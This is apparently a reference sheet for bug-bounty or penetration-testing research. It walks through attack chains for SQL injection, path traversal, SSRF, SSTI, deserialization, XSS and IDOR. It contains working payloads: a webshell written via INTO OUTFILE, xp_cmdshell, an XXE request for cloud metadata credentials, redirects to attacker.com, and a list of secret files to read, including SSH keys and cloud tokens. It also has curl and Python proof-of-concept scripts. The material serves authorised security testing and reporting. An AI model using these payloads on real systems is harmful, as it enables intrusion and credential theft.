# Exploitation Patterns & Attack Chains

Reference for constructing complete attack chains during exploitability research.

## Data Flow Analysis Patterns

### Tracing User Input

```
HTTP Request → Framework Parser → Controller → Service → Database/File/Command
     ↓              ↓                ↓           ↓            ↓
   Entry        Middleware       Handler      Business     Dangerous
   Point        (auth/rate)      Logic        Logic        Operation
```

### Common Source-to-Sink Paths

| Source | Typical Path | Sink |
|--------|--------------|------|
| Query param | Router → Controller → Template | XSS/SSTI |
| POST body | Parser → Controller → Query builder | SQLi |
| File upload | Multipart → Storage → Processor | RCE/Path Traversal |
| Header (Host) | Middleware → URL builder | SSRF/Open Redirect |
| Cookie | Session → Deserializer | RCE |
| Path param | Router → File handler | Path Traversal |

### Key Questions at Each Step

1. **Is data validated/sanitized?**
2. **Can validation be bypassed?**
3. **Is sanitization applied before or after transformation?**
4. **Are there alternative paths that skip controls?**
5. **Does the sink have built-in protections?**

## Vulnerability-Specific Attack Chains

### SQL Injection → Full Compromise

```
1. Identify injection point
   → Login form, search, filters, sort params

2. Determine database type
   → Error messages, timing, version queries

3. Extract schema
   → UNION SELECT, blind enumeration

4. Dump credentials
   → Users table, password hashes

5. Escalate access
   → Read files (LOAD_FILE), write files (INTO OUTFILE)
   → Stored procs (xp_cmdshell)

6. Full compromise
   → Crack hashes or use extracted secrets
```

### Path Traversal → Secrets Extraction

```
1. Confirm traversal works
   → ../../etc/passwd (Linux), ../../Windows/win.ini

2. Identify valuable targets
   → Application configs, .env files
   → SSH keys (~/.ssh/id_rsa)
   → Cloud credentials (~/.aws/credentials)
   → Database files (SQLite, H2)
   → Source code for more vulns

3. Escalate
   → Use extracted creds for further access
   → Read source for more vulnerabilities
```

**High-Value Targets:**
```
/etc/passwd
/etc/shadow (if readable)
/root/.ssh/id_rsa
/home/*/.ssh/id_rsa
/proc/self/environ
/proc/self/cmdline
~/.aws/credentials
~/.azure/accessTokens.json
~/.config/gcloud/access_tokens.db
/var/run/secrets/kubernetes.io/serviceaccount/token
.env
config/database.yml
application.properties
settings.py
wp-config.php
```

### SSRF → Cloud Credential Theft

```
1. Confirm SSRF
   → Request to controlled server (Burp Collaborator)

2. Identify cloud environment
   → AWS: 169.254.169.254/latest/meta-data/
   → GCP: metadata.google.internal
   → Azure: 169.254.169.254/metadata/instance

3. Extract credentials
   → AWS: /latest/meta-data/iam/security-credentials/ROLE_NAME
   → GCP: /computeMetadata/v1/instance/service-accounts/default/token

4. Use credentials
   → AWS CLI with extracted creds
   → Access S3, EC2, secrets manager
```

### SSTI → Remote Code Execution

```
1. Identify template engine
   → {{7*7}}=49 (Jinja2, Twig)
   → ${7*7}=49 (Freemarker, Velocity)
   → #{7*7}=49 (Ruby ERB)

2. Escalate to code execution
   → Engine-specific payloads
   → Find builtin with exec/system access

3. Establish persistence
   → Reverse shell
   → Create new user
   → Plant webshell
```

### Deserialization → RCE

```
1. Identify serialization format
   → Java: Base64 with rO0AB... or AC ED 00 05
   → PHP: O:ClassName:...
   → Python: Pickle (base64 or binary)
   → .NET: AAEAAAD...

2. Find gadget chain
   → Known libraries in dependencies
   → Application-specific POP chains

3. Generate payload
   → ysoserial (Java)
   → phpggc (PHP)
   → Custom pickle (Python)

4. Deliver and execute
   → Replace serialized data
   → Trigger deserialization endpoint
```

### XSS → Account Takeover

```
1. Confirm XSS type
   → Reflected: in URL params
   → Stored: persists in page
   → DOM: client-side only

2. Craft session stealer
   → document.cookie exfiltration
   → Or: Fetch session tokens from DOM

3. Deliver to victim
   → Reflected: malicious link
   → Stored: plant in user-visible location

4. Capture and use session
   → Set stolen cookie
   → Access victim account
```

### IDOR → Data Breach

```
1. Identify numeric/predictable IDs
   → /api/users/123
   → /documents/invoice-001.pdf

2. Test boundary access
   → Change 123 to 124, 1, 0, -1
   → Bruteforce ID range

3. Enumerate data
   → Script to dump all accessible records
   → Identify sensitive fields

4. Assess impact
   → PII exposure
   → Financial data
   → Other users' data
```

## Chained Vulnerability Patterns

### SSRF + Path Traversal = File Read

```
# SSRF with file:// protocol
?url=file:///etc/passwd

# If file:// blocked, use redirect
?url=http://attacker.com/redirect
# redirect to file:///etc/passwd
```

### SQL Injection + File Write = RCE

```sql
# MySQL with FILE privilege
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# SQL Server
EXEC xp_cmdshell 'whoami';
```

### XXE + SSRF = Cloud Credential Theft

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name">
]>
<root>&xxe;</root>
```

### Open Redirect + OAuth = Token Theft

```
# Manipulate redirect_uri
/oauth/authorize?client_id=X&redirect_uri=http://attacker.com

# Or partial path bypass
/oauth/authorize?redirect_uri=https://legit.com.attacker.com
```

### Race Condition + Balance = Double Spend

```
# Simultaneous requests to:
POST /withdraw?amount=100

# If balance check isn't atomic:
# Request 1: Check balance (100), deduct 100
# Request 2: Check balance (100), deduct 100
# Result: Withdrew 200 from balance of 100
```

## Proof of Concept Templates

### Minimal PoC (Demonstration)

```
1. Navigate to: [URL]
2. Enter payload: [PAYLOAD]
3. Observe: [RESULT]
```

### Full Exploitation PoC

```bash
#!/bin/bash
# PoC for [Vulnerability] in [Target]
# Author: [Your Name]
# Date: [Date]

TARGET="https://vulnerable.example.com"

# Step 1: [Description]
curl -s "$TARGET/endpoint" -d "param=payload" | grep "expected_output"

# Step 2: Extract sensitive data
SECRET=$(curl -s "$TARGET/exploit" | jq -r '.secret')
echo "Extracted secret: $SECRET"

# Step 3: Demonstrate impact
curl -H "Authorization: Bearer $SECRET" "$TARGET/admin"
```

### cURL-Based PoC

```bash
# SQL Injection - Boolean blind
curl -s "https://target.com/search?q=test'+AND+1=1--+-" | grep -c "results"
# Returns 1 (true condition)

curl -s "https://target.com/search?q=test'+AND+1=2--+-" | grep -c "results"
# Returns 0 (false condition)
```

### Python PoC Script

```python
#!/usr/bin/env python3
"""
PoC for [Vulnerability Type] in [Target]
"""
import requests

TARGET = "https://vulnerable.example.com"

def exploit():
    # Payload
    payload = "../../../etc/passwd"

    # Send request
    response = requests.get(
        f"{TARGET}/download",
        params={"file": payload}
    )

    # Verify exploitation
    if "root:x:0:0" in response.text:
        print("[+] Exploitation successful!")
        print(response.text[:500])
        return True
    else:
        print("[-] Exploitation failed")
        return False

if __name__ == "__main__":
    exploit()
```

## Impact Assessment Framework

### CVSS-Style Scoring Considerations

| Factor | High | Medium | Low |
|--------|------|--------|-----|
| Attack Vector | Network | Adjacent | Local |
| Privileges Required | None | Low | High |
| User Interaction | None | Required | N/A |
| Confidentiality | High (all data) | Low (some data) | None |
| Integrity | High (modify all) | Low (modify some) | None |
| Availability | High (DoS) | Low (degraded) | None |

### Business Impact Categories

```
CRITICAL:
- Full system/data compromise
- Authentication bypass to admin
- RCE on production
- Mass PII exposure

HIGH:
- Significant data exposure
- Privilege escalation
- Financial impact
- Credential theft

MEDIUM:
- Limited data exposure
- Account-level issues
- Denial of service

LOW:
- Informational disclosure
- Minor config issues
- Theoretical attacks
```

### Reportability Checklist

- [ ] **Reproducible**: Can be demonstrated consistently
- [ ] **In Scope**: Verified against program policy
- [ ] **Impactful**: Clear security consequence
- [ ] **Exploitable**: Not just theoretical
- [ ] **Actionable**: Fix is possible
- [ ] **Novel**: Not a known duplicate
